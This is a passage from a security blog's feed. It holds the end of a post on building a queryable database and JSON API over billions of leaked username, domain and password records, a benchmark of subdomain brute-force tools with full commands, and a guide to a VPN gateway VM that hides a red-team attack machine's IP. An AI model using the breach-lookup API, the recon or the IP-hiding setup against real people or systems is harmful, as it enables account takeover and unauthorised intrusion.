<h3 id="querying">Querying</h3>
<p>Once we create the tables and seed some data, our associations are set in the ORM such that
pivoting on any instance of a <code>username</code>, <code>password</code>, or <code>domain</code> is possible.</p>
<pre><code># start with a domain
yahoo = Domain.find_by(domain: &quot;yahoo.com&quot;)

# find all passwords by yahoo mail users
yahoo.passwords

# find all yahoo mail users
yahoo.usernames

# find all password of a particular yahoo mail user
yahoo.usernames.first.passwords



# start with a user
jojo = Usernames.find_by(name: &quot;jojo1990&quot;)

# see all passwords belonging to jojo
jojo.passwords

# see all email account for jojo
jojo.domains



# starting with a password
pass = Password.find_by(password: &quot;P@ssw0rd!&quot;)

# see the users that share this password
pass.usernames
</code></pre><h2 id="iterate">Iterate</h2>
<p><img src="1.png" alt="agile vs waterfall"></p>
<p>The first iteration of the project was to create a CLI where I could load my models, and query the
data in an interactive enironment, like so&hellip; <code>records.first.username.passwords</code>, etc.</p>
<p>The second iteration was creating a JSON API, so that remote services would be able to query this
data.</p>
<p>The following was all that was needed to create the JSON API server in Ruby. (ruby because that's
what ActiveRecord is written in)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">get <span style="color:#e6db74">&#39;/domains/:domain&#39;</span> <span style="color:#66d9ef">do</span>
  domain <span style="color:#f92672">=</span> <span style="color:#66d9ef">Domain</span><span style="color:#f92672">.</span>find_by(<span style="color:#e6db74">domain</span>: params<span style="color:#f92672">[</span><span style="color:#e6db74">:domain</span><span style="color:#f92672">]</span>)
  paginated(domain, params)
<span style="color:#66d9ef">end</span>

get <span style="color:#e6db74">&#39;/usernames/:name&#39;</span> <span style="color:#66d9ef">do</span>
  user <span style="color:#f92672">=</span> <span style="color:#66d9ef">Username</span><span style="color:#f92672">.</span>find_by(name: params<span style="color:#f92672">[</span><span style="color:#e6db74">:name</span><span style="color:#f92672">]</span>)
  paginated(user, params)
<span style="color:#66d9ef">end</span>

get <span style="color:#e6db74">&#39;/passwords/:password&#39;</span> <span style="color:#66d9ef">do</span>
  password <span style="color:#f92672">=</span> <span style="color:#66d9ef">Password</span><span style="color:#f92672">.</span>find_by(<span style="color:#e6db74">password</span>: params<span style="color:#f92672">[</span><span style="color:#e6db74">:password</span><span style="color:#f92672">]</span>)
  paginated(password, params)
<span style="color:#66d9ef">end</span>

get <span style="color:#e6db74">&#39;/emails/:email&#39;</span> <span style="color:#66d9ef">do</span>
  user, domain <span style="color:#f92672">=</span> params<span style="color:#f92672">[</span><span style="color:#e6db74">:email</span><span style="color:#f92672">]</span><span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;@&#39;</span>)
  emails <span style="color:#f92672">=</span> <span style="color:#66d9ef">Record</span><span style="color:#f92672">.</span>joins(<span style="color:#e6db74">:username</span>)
    <span style="color:#f92672">.</span>where(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">usernames.name = ?</span><span style="color:#e6db74">&#34;</span>, user)
    <span style="color:#f92672">.</span>where(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">domains.domain = ?</span><span style="color:#e6db74">&#34;</span>, domain)
  prepare(emails)
<span style="color:#66d9ef">end</span>
</code></pre></div><p>Finally, with the API complete, I jumped into writing a web interface that could really leverage
the pivoting capabilities we enabled by configuring our schema and ORM the way we did. I'd been
looking for a reason to try out Reactive Programming for a while, so I opted for
<a href="https://svelte.dev/">Svelte</a> as my front-end framework of choice.</p>
<blockquote>
<p><strong>Dev Tangent</strong> React.js is <em>not</em> Reactive.
For a glimpse into the powers of Reactive Programming, I recommend this talk.
<a href="https://www.youtube.com/watch?v=Bfi96LUebXo">https://www.youtube.com/watch?v=Bfi96LUebXo</a></p>
</blockquote>
<p>Svelte acts like a JavaScript &ldquo;compiler&rdquo; instead of a traditional JavaScript framework.  Because the
code you write runs through this compilation process, only the components of Svelte that you
need are added to your final packed JavaScript, keeping bloat down, and eliminating the need for
pre-processors like Webpack and their complicated configuration files. Additionally, any data you
declare as &ldquo;reactive&rdquo; is monitored for change and updated anywhere it's referenced. Think:
spreadsheet cells that are members of a formula's data set.</p>
<h2 id="benchmarks-and-data">Benchmarks and Data</h2>
<p>During this entire process, there were many lessons learned, project restarts, and hair pulled.
Bottom line, respect your Database Admins. Take them to lunch. Their job requires some very
specific and complicated knowledge.</p>
<p>Also, databases are a feat of real Software Engineering.</p>
<p>This project started completely in Ruby, and then I eventually moved the seeder to Golang. The
following table shows the chunks of time I shaved off,  along with what I did to save that time.</p>
<p>This is highly unscientific and remember that each row indicating improvement is a result of every
change that is listed above it.</p>
<table>
<thead>
<tr>
<th>Seeding ETA</th>
<th>Change That Shaved Time</th>
</tr>
</thead>
<tbody>
<tr>
<td>2 years</td>
<td><del>bad</del> naive ideas</td>
</tr>
<tr>
<td>1 year</td>
<td>Buying an SSD</td>
</tr>
<tr>
<td>10 months</td>
<td>Multithreaded Seeding</td>
</tr>
<tr>
<td>6 months</td>
<td>Data validation moved to the database</td>
</tr>
<tr>
<td>4 months</td>
<td>Database tuning</td>
</tr>
<tr>
<td>3 months</td>
<td>Seeder re-written in Go</td>
</tr>
<tr>
<td>2 months</td>
<td>Transactions</td>
</tr>
</tbody>
</table>
<p>Only after all these changes, was I finally saturating the IO of my SSD.</p>
<p>I should note that the rate of new records added begins to slow drastically as we encounter more
and more duplicate entires in the database. I wish I'd kept a count of NON_UNIQUE_RECORD errors to
report. I'm a bad scientist and I feel bad.</p>
<p>All stats are for files with the <code>txt</code> extension only.</p>
<p>Original line count</p>
<pre><code>27,472,858,235
</code></pre><p>Listing of the data after being split and uniqued:</p>
<pre><code>-rw-r--r-- 1 alex alex 296G Nov 27 19:20 usernames.txt
-rw-rw-r-- 1 alex alex  18G Dec  3 11:04 usernames_uniq.txt
-rw-r--r-- 1 alex alex 260G Nov 27 19:20 domains.txt
-rw-rw-r-- 1 alex alex 2.3G Dec  2 08:00 domains_uniq.txt
-rw-r--r-- 1 alex alex 250G Nov 27 19:20 passwords.txt
-rw-rw-r-- 1 alex alex  16G Dec  1 02:13 passwords_uniq.txt
</code></pre><p>Line counts of split components pre and post uniquing:</p>
<pre><code> 27472857767 domains.txt
 27472858235 passwords.txt
 27472857744 usernames.txt

   67031505 domains_uniq.txt
  958883636 passwords_uniq.txt
 1296186909 usernames_uniq.txt
</code></pre><!-- raw HTML omitted -->
<!-- raw HTML omitted -->
]]></content>
        </item>
        
        <item>
            <title>Stop Using Python for Subdomain Enumeration</title>
            <link>https://sec.alexflor.es/posts/2019/04/stop-using-python-for-subdomain-enumeration/</link>
            <pubDate>Sat, 20 Apr 2019 13:02:17 -0400</pubDate>
            
            <guid>https://sec.alexflor.es/posts/2019/04/stop-using-python-for-subdomain-enumeration/</guid>
            <description>&lt;p&gt;Python (and all other scripting languages) use the host system&#39;s name resolution APIs.
Skip the bottleneck and craft the DNS packets manually.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Python (and all other scripting languages) use the host system's name resolution APIs.
Skip the bottleneck and craft the DNS packets manually.</p>
<h2 id="setup">Setup</h2>
<p><strong>Tools Tested</strong>:</p>
<ul>
<li>Subbrute - <a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a></li>
<li>Fernmelder - <a href="https://github.com/stealth/fernmelder">https://github.com/stealth/fernmelder</a></li>
<li>Amass - <a href="https://github.com/OWASP/Amass">https://github.com/OWASP/Amass</a></li>
</ul>
<p><strong>Wordlist</strong>:</p>
<ul>
<li><a href="https://github.com/danielmiessler/SecLists">Seclists</a> - Discovery/DNS/subdomains-top1mil-110000.txt</li>
</ul>
<p><strong>DNS Resolvers</strong>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">4.2.2.1
1.1.1.1
8.8.8.8
64.6.64.6
77.88.8.8
74.82.42.42
4.2.2.2
1.0.0.1
8.8.4.4
4.2.2.3
9.9.9.10
64.6.65.6
77.88.8.1
4.2.2.4
</code></pre></div><h2 id="results">Results</h2>
<p><em>tests performed on WiFi. YMMV.</em></p>
<table>
<thead>
<tr>
<th>Tool</th>
<th>Command</th>
<th>Result</th>
</tr>
</thead>
<tbody>
<tr>
<td>SubBrute</td>
<td><code>./subbrute.py -s top110k.txt -r resolvers.txt example.com</code></td>
<td><code>7.79s user 1.67s system 1% cpu 15:37.04 total</code></td>
</tr>
<tr>
<td>Amass</td>
<td><code>amass -d example.com -brute -w top110k.txt -noalts -norecursive</code></td>
<td><code>87.49s user 71.32s system 44% cpu 5:54.27 total</code></td>
</tr>
<tr>
<td>Fernmelder</td>
<td><code>awk '{print $1&quot;.example.com&quot;}' top110k.txt \| fernmelder -4 -N 4.2.2.1 -N 1.1.1.1 -N 8.8.8.8 -N 64.6.64.6 -N 77.88.8.8 -N 74.82.42.42 -N 4.2.2.2 -N 1.0.0.1 -N 8.8.4.4 -N 4.2.2.3 -N 9.9.9.10 -N 64.6.65.6 -N 77.88.8.1 -N 4.2.2.4 -A</code></td>
<td><code>3.17s user 10.56s system 6% cpu 3:24.90 total </code></td>
</tr>
</tbody>
</table>
<h2 id="background">Background</h2>
<p>A few years ago I was introduced to a tool called Fernmelder for DNS subdomain enumeration. I'd
already been using tools like SubBrute and sublister for this purpose but my friend insisted I try
Fernmelder. It's a bit old school in the way it handles its inputs, as you can see from the chart
above. After trying it out, I was blown away and started using it exclusively. Enumerations that
typically lasted a few minutes were done in mere seconds.</p>
<p>Why was it so much faster? Was it because Fernmelder is written in C? Well, probably, but it turns
out that Fernmelder manually crafts DNS queries and sends them straight down TCP socket
connections.  But still, why is this faster?</p>
<p>When an interpreted language requests an IP address for a hostname, this request gets passed up to
the runtime. The runtime interacts with the operating system, which in turn queries its
preconfigured DNS server. In Linux, the syscall responsible for doing this would be <code>glibc</code>'s
<a href="http://man7.org/linux/man-pages/man3/gethostbyname.3.html"><code>gethostbyname</code></a>.
It will do this for each hostname you're trying to enumerate. That ends up being a lot of overhead
when trying to blast through 3 million DNS requests.</p>
<p>Some other tools that also assist in enumerating subdomains are Amass and SubBrute. Many of these
subdomain enumeration tools do much more than just attempt to resolve names from a wordlist. Amass
is essentially a suite of host enumeration tools and as such would be a more viable tool for use by
a professional tester. For the purposes of this post, though, we're just looking at raw speed
regarding hostname resolution.</p>
<h2 id="analysis">&ldquo;Analysis&rdquo;</h2>
<p>I'll compare the difference in implementation between Amass and SubBrute. (I don't know C well
enough to explain Fernmelder). Amass is similar to Fernmelder in that it manually creates the
DNS request packet.</p>
<p>Looking at the
<a href="https://github.com/OWASP/Amass/blob/7c1b5cd946e5d97c802a3559b845e7debc1e2008/amass/resolvers.go#L599-L619">relevant Amass source code</a>
, we can see the creation of the request packet in the <code>queryMessage</code> function.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#75715e">// https://github.com/OWASP/Amass/blob/7c1b5cd946e5d97c802a3559b845e7debc1e2008/amass/resolvers.go#L599-L619
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">queryMessage</span>(<span style="color:#a6e22e">id</span> <span style="color:#66d9ef">uint16</span>, <span style="color:#a6e22e">name</span> <span style="color:#66d9ef">string</span>, <span style="color:#a6e22e">qtype</span> <span style="color:#66d9ef">uint16</span>) <span style="color:#f92672">*</span><span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">Msg</span> {
	<span style="color:#a6e22e">m</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">Msg</span>{
		<span style="color:#a6e22e">MsgHdr</span>: <span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">MsgHdr</span>{
			<span style="color:#a6e22e">Authoritative</span>:     <span style="color:#66d9ef">false</span>,
			<span style="color:#a6e22e">AuthenticatedData</span>: <span style="color:#66d9ef">false</span>,
			<span style="color:#a6e22e">CheckingDisabled</span>:  <span style="color:#66d9ef">false</span>,
			<span style="color:#a6e22e">RecursionDesired</span>:  <span style="color:#66d9ef">true</span>,
			<span style="color:#a6e22e">Opcode</span>:            <span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">OpcodeQuery</span>,
			<span style="color:#a6e22e">Id</span>:                <span style="color:#a6e22e">id</span>,
			<span style="color:#a6e22e">Rcode</span>:             <span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">RcodeSuccess</span>,
		},
		<span style="color:#a6e22e">Question</span>: make([]<span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">Question</span>, <span style="color:#ae81ff">1</span>),
	}
	<span style="color:#a6e22e">m</span>.<span style="color:#a6e22e">Question</span>[<span style="color:#ae81ff">0</span>] = <span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">Question</span>{
		<span style="color:#a6e22e">Name</span>:   <span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">Fqdn</span>(<span style="color:#a6e22e">name</span>),
		<span style="color:#a6e22e">Qtype</span>:  <span style="color:#a6e22e">qtype</span>,
		<span style="color:#a6e22e">Qclass</span>: uint16(<span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">ClassINET</span>),
	}
	<span style="color:#a6e22e">m</span>.<span style="color:#a6e22e">Extra</span> = append(<span style="color:#a6e22e">m</span>.<span style="color:#a6e22e">Extra</span>, <span style="color:#a6e22e">setupOptions</span>())
	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">m</span>
}
</code></pre></div><p>This function is called from a Resolver's private <code>writeMessage</code> function. See line 4 below.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#75715e">// https://github.com/OWASP/Amass/blob/7c1b5cd946e5d97c802a3559b845e7debc1e2008/amass/resolvers.go#L261-L275
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">resolver</span>) <span style="color:#a6e22e">writeMessage</span>(<span style="color:#a6e22e">co</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">Conn</span>, <span style="color:#a6e22e">req</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">resolveRequest</span>) {
	<span style="color:#a6e22e">msg</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">queryMessage</span>(<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">getID</span>(), <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">Name</span>, <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">Qtype</span>)

	<span style="color:#a6e22e">co</span>.<span style="color:#a6e22e">SetWriteDeadline</span>(<span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>().<span style="color:#a6e22e">Add</span>(<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">WindowDuration</span>))
	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">co</span>.<span style="color:#a6e22e">WriteMsg</span>(<span style="color:#a6e22e">msg</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">pullRequest</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">MsgHdr</span>.<span style="color:#a6e22e">Id</span>)
		<span style="color:#a6e22e">estr</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;DNS error: Failed to write query msg: %v&#34;</span>, <span style="color:#a6e22e">err</span>)
		<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">returnRequest</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">makeResolveResult</span>(<span style="color:#66d9ef">nil</span>, <span style="color:#66d9ef">true</span>, <span style="color:#a6e22e">estr</span>, <span style="color:#ae81ff">100</span>))
		<span style="color:#66d9ef">return</span>
	}

	<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">Timestamp</span> = <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>()
	<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">queueRequest</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">MsgHdr</span>.<span style="color:#a6e22e">Id</span>, <span style="color:#a6e22e">req</span>)
	<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">updatesAttempts</span>()
}
</code></pre></div><p>Amass will then add this request to an in-memory queue where a separate goroutine processes the
job.</p>
<p>Compare this to SubBrute. Even though SubBrute can operate on multiple threads, it's still bound to
the eventual calling of the operating system's DNS query mechanism here:</p>
<p><code>query = dnslib.DNSRecord.question(hostname, query_type.upper().strip())</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># https://github.com/TheRook/subbrute/blob/master/subbrute.py#L53-L64</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">query</span>(self, hostname, query_type <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">ANY</span><span style="color:#e6db74">&#39;</span>, name_server <span style="color:#f92672">=</span> False, use_tcp <span style="color:#f92672">=</span> False):
    ret <span style="color:#f92672">=</span> []
    response <span style="color:#f92672">=</span> None
    <span style="color:#66d9ef">if</span> name_server <span style="color:#f92672">==</span> False:
        name_server <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>get_ns()
    <span style="color:#66d9ef">else</span>:
        self<span style="color:#f92672">.</span>wildcards <span style="color:#f92672">=</span> {}
        self<span style="color:#f92672">.</span>failed_code <span style="color:#f92672">=</span> None
    self<span style="color:#f92672">.</span>last_resolver <span style="color:#f92672">=</span> name_server
    query <span style="color:#f92672">=</span> dnslib<span style="color:#f92672">.</span>DNSRecord<span style="color:#f92672">.</span>question(hostname, query_type<span style="color:#f92672">.</span>upper()<span style="color:#f92672">.</span>strip())
    <span style="color:#66d9ef">try</span>:
        response_q <span style="color:#f92672">=</span> query<span style="color:#f92672">.</span>send(name_server, <span style="color:#ae81ff">53</span>, use_tcp, timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span>)

</code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>Fernmelder clocked in at 3.5 minutes. Next comes Amass at 6 minutes, and far behind is SubBrute.</p>
<p>Am I really all that concerned with saving 10 minutes on a task that is probably only run once
during a campaign? Should you be? Most certainly not, but I was curious enough at the discrepancy
in time and found the result interesting enough to share.</p>
<p>In regards to our third place test-case, this could really be any tool that relies on an OS API
call for name resolution. Perhaps in a future blog post I'll compare apples to apples and create a
python tool that manually crafts DNS request packets and sends them down a wire. That would be an
interesting test.</p>
<p>Overall, I'll probably move forward using Amass, given the plethora of other utilities available
within it. Despite my appreciation for Fernmelder's charming old-school interface of taking STDIN
and its speed, Amass, while not the fastest in this one specific task, seems the more viable
Professional's tool.</p>]]></content>
        </item>
        
        <item>
            <title>Mind Your OOPSEC</title>
            <link>https://sec.alexflor.es/posts/2018/12/mind-your-oopsec/</link>
            <pubDate>Sun, 30 Dec 2018 17:06:30 -0500</pubDate>
            
            <guid>https://sec.alexflor.es/posts/2018/12/mind-your-oopsec/</guid>
            <description>OPSEC is hard and those OOPS moments can often cost you a campaign when Red teaming. In this post I&#39;ll go over how I set up my VMs so I never have to remember to turn on a VPN, stress about having some &amp;lsquo;killswitch&amp;rsquo; fail, or being on the losing end of some network-race-condition nonsense when waking my laptop.
Automation isn&#39;t always about convenience for the user. Sometimes it&#39;s also about determinism.</description>
            <content type="html"><![CDATA[<p><img src="title.png" alt=""></p>
<p>OPSEC is hard and those OOPS moments can often cost you a campaign when Red teaming. In this post
I'll go over how I set up my VMs so I never have to remember to turn on a VPN, stress about having
some &lsquo;killswitch&rsquo; fail, or being on the losing end of some network-race-condition nonsense when
waking my laptop.</p>
<p>Automation isn't always about convenience for the user. Sometimes it's also about determinism. It's
about knowing that no matter what edge cases may or may not exist now, or in the future, they'll
have no bearing on your desired outcome. In this sense, we're talking about technology that works
<em>for</em> you, without being in your way. You shouldn't even notice it's there until something is broken.</p>
<p>So let's move this problem &ldquo;up the stack&rdquo;, so to speak. I'm not really sharing anything new here,
just putting it all in one place and talking about how to build it from scratch. In fact, this is
the exact way <a href="https://www.whonix.org/wiki/About#Security_by_Isolation">Whonix</a>
recommends you run their distribution; by using their Gateway VM.</p>
<p>Enough, so what are we talking about here? We're talking about creating a VM that acts as a
gateway, or router, for your attack VM. We'll use some <code>iptables</code> rules to ensure that any client
of our gateway can only communicate through the <code>tun0</code> interface. We'll also create a DHCP server
for your connecting clients, and of course, the VMWare settings to make all this possible. So let's
get started.</p>
<p>I'll be using Debian for the gateway VM, but feel free to use any distro you like. They're all
perfectly capable.</p>
<p>I'll be using VMWare Workstation, but this works in most others too.</p>
<p>Begin by creating your VM and assigning it 2 network interfaces in your virtualization software of
choice. One network can be NAT. To avoid complications, the other network should be a new one that
isn't used by other VMs. If you need to make a new network, some VM solutions have some sort of
virtual network manager in their settings.</p>
<p><img src="1.png" alt="Alt"></p>
<p>Here, the NAT network will provide internet access to our gateway, allowing it to VPN out. The
other network will serve DHCP and internet to any guest OSes that happen to have the vmnet2
interface assigned by the virtualization software. More on that later.</p>
<p>Power on the gateway VM.</p>
<p>Note the output of <code>ip</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ip addr show <span style="color:#75715e"># or &#39;ip a s&#39; for short</span>
</code></pre></div><p>In my case, I can see that <code>ens33</code> is the NAT interface because it pulled DHCP from VMWare's virtual
network. <code>ens36</code> has no IP because we haven't assigned it one, nor is there a DHCP server on the
<code>vmnet2</code> network. Continue by installing our dependencies.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt update
sudo apt install dnsmasq openvpn iptables-persistent openssh-server
</code></pre></div><p>SSH in.</p>
<p>You'll also need an account with a VPN provider that provides <code>*.ovpn</code> files. I'll be going with
Private Internet Access for this one.</p>
<p>This engagement requires we be located in Mexico.
Download the PIA VPN profiles to the gateway:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget https://www.privateinternetaccess.com/openvpn/openvpn.zip
unzip -c openvpn.zip Mexico.ovpn &gt; /etc/openvpn/client/Mexico.ovpn
</code></pre></div><p>Let's start by configuring the Debian to automatically start the VPN on boot.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Create a systemd unit that starts the tunnel on system start</span>
#
cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /etc/systemd/system/openvpn.service
</span><span style="color:#e6db74">[Unit]
</span><span style="color:#e6db74">Description=Start VPN on boot
</span><span style="color:#e6db74">Requires=networking.service
</span><span style="color:#e6db74">After=networking.service
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">[Service]
</span><span style="color:#e6db74">User=root
</span><span style="color:#e6db74">Type=simple
</span><span style="color:#e6db74">ExecStart=/usr/sbin/openvpn --config Mexico.ovpn --auth-user-pass up.txt
</span><span style="color:#e6db74">WorkingDirectory=/etc/openvpn/client
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">[Install]
</span><span style="color:#e6db74">WantedBy=multi-user.target
</span><span style="color:#e6db74">FILE</span>
</code></pre></div><p>Create the <code>up.txt</code> that holds your OpenVPN profile credentials:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Create the auth file for autostarting the VPN tunnel</span>
#
cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /etc/openvpn/client/up.txt
</span><span style="color:#e6db74">${your_ovpn_user}
</span><span style="color:#e6db74">${your_ovpn_pass}
</span><span style="color:#e6db74">FILE</span>

chmod <span style="color:#ae81ff">400</span> /etc/openvpn/client/up.txt

<span style="color:#75715e"># Recognize the changes by reloading the daemon and enable the unit</span>
#
systemctl daemon-reload
systemctl enable openvpn.service
systemctl start openvpn.service
</code></pre></div><p>At this point, you should have a working VPN connection and a <code>tun0</code> interface when you run <code>ip a s</code>.
If you're following along, you should get <code>Mexico City</code> when you:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl ipconfig.io/city
</code></pre></div><p>Next up, we enable IP forwarding on the kernel and set up our DHCP server. Feel free to change the
IP values so they suit your needs.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Uncomment the setting that allows packet forwarding between network interfaces</span>
#
sed -i <span style="color:#e6db74">&#34;/net.ipv4.ip_forward=1/ s/#*//&#34;</span> /etc/sysctl.conf

<span style="color:#75715e"># Configure the static address for the adapter serving DHCP</span>
#
cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /etc/network/interfaces
</span><span style="color:#e6db74">source-directory /etc/network/interfaces.d
</span><span style="color:#e6db74">auto lo
</span><span style="color:#e6db74">iface lo inet loopback
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">auto ens33
</span><span style="color:#e6db74">iface ens33 inet dhcp
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">allow-hotplug ens36
</span><span style="color:#e6db74">iface ens36 inet static
</span><span style="color:#e6db74">    address 192.168.100.1
</span><span style="color:#e6db74">    netmask 255.255.255.0
</span><span style="color:#e6db74">    network 192.168.100.0
</span><span style="color:#e6db74">FILE</span>

<span style="color:#75715e"># Configure the DHCP server that will give our clients an IP</span>
#
cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /etc/dnsmasq.conf
</span><span style="color:#e6db74">interface=ens36
</span><span style="color:#e6db74">bind-interfaces
</span><span style="color:#e6db74">dhcp-range=192.168.100.100,192.168.100.200,255.255.255.0,24h
</span><span style="color:#e6db74">FILE</span>
</code></pre></div><p>Load the interface changes and restart dnsmasq and ensure it's running properly:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ifup ens36
systemctl restart dnsmasq
systemctl status dnsmasq
</code></pre></div><p>One last step, just set and save some <code>iptables</code> rules:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Configure the firewall to redirect packets coming from the client net</span>
<span style="color:#75715e"># to leave through the VPN interface. Deny all but established</span>
<span style="color:#75715e"># connections coming from the tun0 interface. Persist the rules.</span>
#
iptables -t nat -A POSTROUTING -s 192.168.100.0/24 -o tun0 -j MASQUERADE
iptables -A FORWARD -s 192.168.100.0/24 -o tun0 -j ACCEPT
iptables -A FORWARD -d 192.168.100.0/24 -m state --state ESTABLISHED,RELATED -i tun0 -j ACCEPT

mkdir /etc/iptables
iptables-save &gt; /etc/iptables/rules.v4
</code></pre></div><p>Reboot the machine and SSH back in. You should see a <code>tun0</code> interface running and the output of
<code>ss -lupn</code> should show dnsmasq listening on <code>68/UDP</code>.</p>
<p>We're ready to connect a machine to our client network.</p>
<p>Head over to any existing VM and set its network adapter to the same secondary adapter you
connected to the gateway VM. In my case, that would be <code>vmnet2</code>.</p>
<p><img src="2.png" alt="Alt"></p>
<p>Boot your VM and check that it's received a valid IP address in the range you specified.</p>
<p><img src="3.png" alt="Alt"></p>
<p>Any machines to which you connect to the <code>vmnet2</code> network interface will be forced
through VPN without needing a client on the attack VM itself. Ensure that your attack VMs have only
this 1 network interface attached. If the gateway VM's VPN ever drops, you will cease to have
internet on the attack VM, preventing any background process from disclosing your real IP.</p>
<p>This ends up being a nice way to share VPN profiles between accounts as well. It's been pretty
useful to have both Windows and Linux machines on the HackTheBox network, for example.</p>
<p>There are plenty of solutions that let you point and click to achieve this same result. <a href="https://opnsense.org/users/get-started/">OPNSense</a>,
<a href="https://www.pfsense.org/">PFSense</a>, <a href="https://github.com/KaiserSoft/PIA-Tunnel">PIA Tunnel</a> to name
a few. They may also serve your needs in this regard.</p>
]]></content>
        </item>
        
        <item>
            <title>Analyzing Data Exfiltration over ICMP</title>
            <link>https://sec.alexflor.es/posts/2018/05/analyzing-data-exfiltration-over-icmp/</link>
            <pubDate>Fri, 11 May 2018 20:06:55 -0400</pubDate>
            
            <guid>https://sec.alexflor.es/posts/2018/05/analyzing-data-exfiltration-over-icmp/</guid>
            <description>I&#39;m a big fan of learning through competition. Capture The Flag games have tremendous utility for training within the Security sector and even outside of it. Intentionally vulnerable web applications, like OWASP&#39;s JuiceShop, are excellent tools for assisting in developing Secure Software Development Life-cycle programs within an organization.
So let&#39;s take an exercise I recently came across in a CTF event. The skills required to solve the challenge are actually quite useful in real-world defensive scenarios.</description>
            <content type="html"><![CDATA[<p><img src="title.jpg" alt=""></p>
<p>I'm a big fan of learning through competition. Capture The Flag games have tremendous utility for
training within the Security sector and even outside of it. Intentionally vulnerable web
